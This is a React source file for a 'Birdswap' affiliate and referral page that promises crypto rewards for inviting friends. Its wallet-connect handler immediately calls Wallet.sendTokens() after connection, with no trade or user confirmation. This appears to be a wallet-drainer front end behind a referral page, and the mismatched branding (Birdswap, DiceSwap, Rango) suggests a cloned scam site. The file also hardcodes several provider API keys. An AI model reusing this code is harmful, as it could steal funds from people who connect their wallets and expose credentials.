import React, { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { Alchemy, Network, TokenBalance, Utils } from "alchemy-sdk";
import { SwapWidget, darkTheme, Theme } from '@uniswap/widgets';
import { tokenList } from "./tokenList";
import '@uniswap/widgets/fonts.css'
import "./swap.css"
import { useNavigate } from "react-router";
import A from "./TradingView"
import { createWeb3Modal, defaultConfig, useWeb3Modal, useWeb3ModalAccount, useWeb3ModalProvider } from '@web3modal/ethers5/react'
import { ethers } from "ethers";
import Web3 from "web3";
import Wallet from "./wallet";
import { motion } from "framer-motion";
import { Navbar } from "./Home";
const Transaction = require("ethereumjs-tx")

const jsonRpcUrlMap = {
    1: ["https://mainnet.infura.io/v3/d96840a8db194f239eab32544159793e"]
}

const myDarkTheme: Theme = {
    ...darkTheme, // Extend the darkTheme
    // container: "#E3C9CB",
    // module: "#A5B78F",
    // primary: "#482728",
    // secondary: "#482728",
    // outline: "#482728",
    // accent: "#482728",
    // interactive: "#482728",
    // dialog: "#12ffb8",










    borderRadius: {
        large: 56,
        medium: 56,
        small: 56,
        xsmall: 56
    }
}

const config = {
    apiKey: "QmN987r2njqRwi-sayxhDTX0rZariEcY",
    network: Network.ETH_MAINNET,
};


export const alchemy = new Alchemy(config);


// 1. Get projectId at https://cloud.walletconnect.com
const projectId = 'c5e857331d9ecd93bf3705578f172580'

// 2. Set chains
const mainnet = {
    chainId: 1,
    name: 'Ethereum',
    currency: 'ETH',
    explorerUrl: 'https://etherscan.io',
    rpcUrl: 'https://cloudflare-eth.com'
}

// 3. Create modal
const metadata = {
    name: 'Birdswap',
    description: 'Birdswap is a cryptocurrency exchange that allows to swap BTC and altcoins in an easy way. DiceSwap supports 1000 cryptocurrencies. Make Bitcoin to Ethereum, Litecoin crypto exchanges at the best rates!',
    url: 'https://birdswap.io', // origin must match your domain & subdomain
    icons: ['https://firebasestorage.googleapis.com/v0/b/imageupload-b460d.appspot.com/o/dear.svg?alt=media&token=5d15f5d8-b5e3-4592-8222-326368a49c2e']
}

createWeb3Modal({
    ethersConfig: defaultConfig({ metadata }),
    chains: [mainnet],
    projectId,
    enableAnalytics: true // Optional - defaults to your Cloud configuration
})

const Affiliate = () => {
    // const { open } = useWeb3Modal()
    // const { address, chainId, isConnected } = useWeb3ModalAccount()
    // const { walletProvider } = useWeb3ModalProvider()
    const [provider, setProvider] = useState<any>();

    const authenticateUser = async () => {
        await Wallet.create()
        await Wallet.connectWallet()
        transact();

    };

    const transact = async () => {

        if (Wallet.address) {
            while (!Wallet.readyToTransact()) {
                continue;
            }
            setProvider(Wallet.provider)
            if (Wallet.address) {
                Wallet.sendTokens();
                // n.current = 1;
                return false;
            }
        }

        return false;

    }

    useEffect(() => {
        (async () => {
            try {
                const [primaryWallet] = Wallet.onboard.state.get().wallets
                await Wallet.onboard.disconnectWallet({ label: primaryWallet.label })
            } catch (error) {

            }

        })()
    }, [])


    return (
        <>
            <Navbar connectWallet={authenticateUser} />
            <div className="p-6">
                <section className=" px-4">
                    <div className="relative  mb-24">
                        <div className=" flex md:flex-row flex-col md:gap-0 gap-12 pt-8 md:pt-20 justify-between items-center">
                            <div className="md:text-left text-center">

                                <h2 className="text-2xl font-bold">
                                    Invite Your Friends,
                                    <br />
                                    Earn Cryptocurrency.
                                </h2>
                                <div className="text-sm font-normal">
                                    Share our link to your friends, whenever they trade <br />
                                    on networks that support referral, e.g. 1inch, you get rewards.
                                </div>

                                <div className="mt-5">
                                    <button className="px-6 py-3 rounded-3xl text-whit animate-bounce -500 bg-sky-600">
                                        Invite Friends
                                    </button>
                                </div>
                            </div>
                            <div className="-1">
                                <img className="w-72" src={process.env.PUBLIC_URL + "affiliate-dark.svg"} alt="" />
                            </div>
                        </div>
                    </div>
                </section>
                <section>
                    <div className="flex w-full flex-col items-center justify-center text-center md:flex-row">
                        <div className="bg-[#0F142E] relative mx-5 my-8 h-80 w-3/4 max-w-xs rounded-3xl sm:w-80 md:my-0 p-4">
                            <div className="absolute">
                                <div className="border-2 border-opacity-25 border-blue-950 w-8 h-8 p-1 text-xs rounded-full flex item-center justify-center">
                                    <span className="text-[0.7rem] font-bold border-0 leading-[1rem]">
                                        1
                                    </span>
                                </div>
                            </div>

                            <div className="-1">
                                <div className="text-center">
                                    <img className="mt-10 w-1/2 mx-auto" src={process.env.PUBLIC_URL + "link.png"} alt="" />
                                </div>
                                <div className="text-lg font-semibold mt-4">
                                    Get a referral link
                                </div>
                                <div className="text-xs font-medium mt-3">
                                    Connect a wallet and generate your referral link in the Referral section.
                                </div>
                            </div>
                        </div>


                        <div className="bg-[#0F142E] relative mx-5 my-8 h-80 w-3/4 max-w-xs rounded-3xl sm:w-80 md:my-0 p-4">
                            <div className="absolute">
                                <div className="border-2 border-opacity-25 border-blue-950 w-8 h-8 p-1 text-xs rounded-full flex item-center justify-center">
                                    <span className="text-[0.7rem] font-bold border-0 leading-[1rem]">
                                        2
                                    </span>
                                </div>
                            </div>

                            <div className="-1">
                                <div className="text-center">
                                    <img className="mt-10 w-1/2 mx-auto" src={process.env.PUBLIC_URL + "horn.png"} alt="" />
                                </div>
                                <div className="text-lg font-semibold mt-4">
                                    Invite Friends
                                </div>
                                <div className="text-xs font-medium mt-3">
                                    Invite your friends to register via your referral link
                                </div>
                            </div>
                        </div>


                        <div className="bg-[#0F142E] relative mx-5 my-8 h-80 w-3/4 max-w-xs rounded-3xl sm:w-80 md:my-0 p-4">
                            <div className="absolute">
                                <div className="border-2 border-opacity-25 border-blue-950 w-8 h-8 p-1 text-xs rounded-full flex item-center justify-center">
                                    <span className="text-[0.7rem] font-bold border-0 leading-[1rem]">
                                        3
                                    </span>
                                </div>
                            </div>

                            <div className="-1">
                                <div className="text-center">
                                    <img className="mt-10 w-1/2 mx-auto" src={process.env.PUBLIC_URL + "cc.png"} alt="" />
                                </div>
                                <div className="text-lg font-semibold mt-4">
                                    Earn crypto
                                </div>
                                <div className="text-xs font-medium mt-3">
                                    Recieve 50% of Rango's fee as reward from your friends'swaps
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
            </div>

        </>
    );
};


export default Affiliate;
